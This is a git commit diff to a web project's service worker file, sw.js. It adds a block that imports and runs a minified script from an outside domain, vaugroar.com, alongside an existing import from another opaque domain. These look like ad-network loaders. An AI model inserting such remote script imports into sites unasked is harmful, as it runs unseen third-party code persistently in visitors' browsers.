f47c093d0b3d9137df28faa2c1f952c22c93ce97
Deep Dey - The FUTURE IITIAN 🎯 <199653739+deepdeyiitgn@users.noreply.github.com>
2025-09-26 20:27:59 +0530

    Update sw.js

--- sw.js
+++ sw.js
@@ -4,3 +4,11 @@ self.options = {
 }
 self.lary = ""
 importScripts('https://fenoofaussut.net/act/files/service-worker.min.js?r=sw')
+
+
+self.options = {
+    "domain": "vaugroar.com",
+    "zoneId": 9935949
+}
+self.lary = ""
+importScripts('https://vaugroar.com/act/files/service-worker.min.js?r=sw')
